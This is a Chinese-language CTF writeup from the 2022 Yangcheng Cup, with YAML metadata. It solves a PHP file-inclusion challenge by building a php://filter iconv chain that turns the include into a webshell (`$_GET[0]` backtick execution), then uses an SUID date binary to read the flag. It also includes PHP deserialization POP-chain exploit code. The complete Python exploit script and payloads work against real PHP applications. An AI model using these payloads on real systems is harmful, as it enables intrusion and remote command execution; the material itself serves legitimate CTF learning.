---
title: 2022 年羊城杯网络安全大赛 Writeup
contest: 2022 羊城杯
year: 2022
difficulty: hard
vuln_type:
- lfi
- rce
- web_unknown
tags:
- hxp-CTF
- includer's-revenge, base64, iconv-chain, php-filter, UTF-8, UTF-16, CSISO2022KR, UCS2, file-include, getflag
attack_chain:
- '题目: ?file=php://filter/...&0=command'
- 黑名单过滤 < ? $ [ ] ; eval > @ _ create install pear
- 绕过 '4' 字符（其转换链带 _）→ 用 '8' 替代
- 'base64 编码 payload: <?=`$_GET[0]`;;/* → PD89YCRfR0VUWzBdYDs7Lyo'
- 'iconv 链: convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'
- 避免 4 (含 _), 用 R/B/C/8/9/f/s/z/U/P/V/0/Y/W 等字符的 iconv 链生成 PHP 标签
- 用 php://filter 的 base64-decode + 多次 iconv 还原 base64
- include 触发命令执行
key_payload: PD89YCRfR0VUWzBdYDs7Lyo (base64 of '<?=`$_GET[0]`;;/*')
one_liner: 2022 羊城杯 rce_me：php://filter + base64 + iconv 链 + hxp includer's revenge
lesson: php://filter 链是高级 LFI；iconv 链字符集转换是 CTF 经典；黑名单绕过要找对应字符
quality: high
full_path: 2022年羊城杯网络安全大赛Writeup.full.md
meta_path: 2022年羊城杯网络安全大赛Writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2022 年羊城杯网络安全大赛 Writeup。2022 羊城杯 rce_me：php://filter + base64 + iconv 链 + hxp includer''s revenge。关键路径：题目: ?file=php://filter/...&0=command → 黑名单过滤 < ? $ [ ] ; eval > @ _ create install pear → 绕过 ''4...'
category: web
subcategory: lfi
subcategories:
- lfi
- rce
- web_other
tools_used:
- C
- PHP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/54929.html
reasoning_chain:
- rce_me 源码 include $file + 黑名单 < ? $ [ ] ; eval > @ _ create install pear → 触发点：php://filter 链 + iconv 转换
- 假设：hxp includer's revenge 思路可移植 → 动作：查 hxp CTF 2021 The End Of LFI? WP
- 观察：hxp 原 EXP 带 '4' 字符对应 iconv 链含 '_' → 假设：必须避开 '4'
- 动作：编写字符→iconv 转换字典 {R/B/C/8/9/f/s/z/U/P/V/0/Y/W...} → 避开 4
- 假设：payload PD89YCRfR0VUWzBdYDs7Lyo (base64 of '<?=`$_GET[0]`;;/*') → 动作：用 iconv 链反序生成 base64 字符
- 观察：php://filter/{filters}/resource=/etc/passwd 返回有效数据 → 下一步：include 触发 system($_GET[0])
- 动作：?file=php://filter/...&0=ls / → find / -user root -perm -4000 → 看到 /usr/bin/date SUID → 假设：date -f /flag 提权
- 观察：date -f /flag 报错 'invalid date Tao By ACT.' → 触发点：flag 在错误信息中
failed_attempts:
- 试图直接用 hxp 原 EXP → 失败：含 '4' 字符触发 _ 黑名单
- 试图 base64 编码绕过黑名单 → 失败：include 不解码 base64
- 试图用 pearcmd → 失败：环境未安装 pear
key_observations:
- php://filter iconv 链转换是高级 LFI 必备工具
- 黑名单绕过要逐字符找对应 iconv 链（避开 _ 字符）
- base64 + ;/* 注释符是 LFI include payload 模板
- SUID date -f 可读文件触发 invalid date 错误信息泄漏
prerequisites:
- PHP php://filter 协议 + convert.iconv 字符集转换链
- hxp CTF includer's revenge 思路
- Linux SUID 提权（date -f / find -exec / nmap）
- base64 编码 + PHP 短标签写法
---
# 2022年羊城杯网络安全大赛Writeup

> 原文: https://www.ctfiot.com/54929.html
> ID: 54929

Web

1.rce_me

题目直接给出了源代码

<?php
(empty($_GET["file"])) ? highlight_file(__FILE__) : $file=$_GET["file"];
function fliter($var): bool{
     $blacklist = ["<","?","$","[","]",";","eval",">","@","_","create","install","pear"];
         foreach($blacklist as $blackword){
           if(stristr($var, $blackword)) return False;
    }
    return True;
}  
if(fliter($_SERVER["QUERY_STRING"]))
{
include $file;
}
else
{
die("Noooo0");
}

看到代码中include $file;，就想起了hxp 的一道题Solving “includer’s revenge” from hxp ctf 2021 without controlling any files,有师傅也给出了具体的详细分析，见hxp CTF 2021 – The End Of LFI?

但是题目环境没有忽略报错，所以直接打文章中的exp,有两个问题：

1.代码中过滤了_,文章中的exp payload带4(对应的转换语句带_)，因此攻击的payload最终会有_

...
'4' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
# 有_
....

2.由于include php代码，且环境没有忽略报错，那么我们就应该对后面乱码进行注释。

# <?=`$_GET[0]`;;/*
base64_payload = "PD89YCRfR0VUWzBdYDs7Lyo"

上述代码解决了什么问题呢？可以简单理解为：

避免了4,因为他对应的转换带_

注释了后面形成乱码的PHP代码


```
<?php
(empty($_GET["file"])) ? highlight_file(__FILE__) : $file=$_GET["file"];
function fliter($var): bool{
     $blacklist = ["<","?","$","[","]",";","eval",">","@","_","create","install","pear"];
         foreach($blacklist as $blackword){
           if(stristr($var, $blackword)) return False;
    }
    return True;
}  
if(fliter($_SERVER["QUERY_STRING"]))
{
include $file;
}
else
{
die("Noooo0");
}
...
'4' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
# 有_
....
# <?=`$_GET[0]`;;/*
base64_payload = "PD89YCRfR0VUWzBdYDs7Lyo"
import requests

url = "http://80.endpoint-f0cb7de3c6d445ca9916505908395850.dasc.buuoj.cn:81/"
file_to_use = "/etc/passwd"
command = "ls /"

#<?=`$_GET[0]`;;/*
base64_payload = "PD89YCRfR0VUWzBdYDs7Lyo"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE'
}

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

    #print(final_payload)
r = requests.get(url, params={
    "0": command,
    "file": final_payload
})

print(r.text)
/?file=final_payload&0=find+/+-user+root+-perm+-4000+-print
/bin/su
/bin/umount
/bin/mount
/bin/date # 可读文件
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
ouo@GOTA:~$ echo "date -f /flag 2>&1" | base64
ZGF0ZSAtZiAvZmxhZyAyPiYxCg==
ouo@GOTA:~$ echo ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|base64 -d
date -f /flag 2>&1
ouo@GOTA:~$ echo ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|base64 -d | sh
date: invalid date ‘Tao By ACT.’
ouo@GOTA:~$
/?file=final_payload&0=echo+ZGF0ZSAtZiAvZmxhZyAyPiYxCg==|base64+-d|sh
$this->c1 指向 new bei() 可以调用bei类的__set()魔术方法
$this->b1 指向new yang() 可以调用yang类的__toString()魔术方法
$this->y1可控，这里可以执行phpinfo函数
<?php
error_reporting("0");
class cheng
{
    public $c1;
 
 public function __construct(){
  $this->c1 = new bei();
 }

}

class bei
{
    public $b1;
    public $b2;
 
 public function __construct(){
  $this->b1 = new yang();
 }

}

class yang{
 public $y1;
 public $y2;
 public function __construct(){
  $this->y1 = "phpinfo";
 }
}

$o = new cheng();
echo serialize($o);
?>
Test::
getFlag()->Fun::
__call(绕__wakeup) -> A::
__get() -> B::
__destruct()
# A->a = Fun()
# B->a = A()

# __call 通过call_user_func_array调用数组传参 -> Fun->func=[new Test,'getFlag']
<?php
class Fun{
    private $func;
    public function __construct(){
        $this->func = [new Test,'getFlag']; // or $this->func = "Test::
getFlag"
    }
}

class Test{
    public function getFlag(){
    }
}

class A{
    public $a;
}

class B{
    public $p;
}

$T = new Test();
$F = new Fun();
$a = new A();
$b = new B();
$a->a = $F;
$b->a = $a;

$aser = serialize($b);
$ser = str_replace('"Fun":1:','"Fun":2:',$aser);
echo urlencode($ser);
# chao code.
<?php
class B{
    public $p;
    public function __construct(){
        $this->a = new A();
    }
}

class A{
    public $a;
    public function __construct(){
        $this->a = new Fun();
    }
}

class Fun{
    private $func = 'call_user_func_array';
    public function __construct()
    {
        $this->func ="Test::
getFlag";
    }
}
$o = array(new B, new B);
$tmp = "i:0;".serialize(new B);
$a =  serialize($o);
$z = str_replace($tmp,$tmp." ",$a);
echo urlencode(str_replace('O:3:"Fun":1:','O:3:"Fun":2:',$z));
Tao in ~Downloads λ ciphey.exe -f .26.txt -C regex -p regex.regex=flag
╭────────────────────────────────────────────────────────────╮
│ Formats used:                                          │
│    caesar:                                                 │
│     Key: 13                                                │
│    base32                                                  │
│    utf8Plaintext: "flag{5dcf3d3407891ba725ffd13224de5435}" │
╰────────────────────────────────────────────────────────────╯
ciphey.exe -f .vig.txt
# 跑了半个小时，发现key->gwhtgwht,还有个密码，但密码不对
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]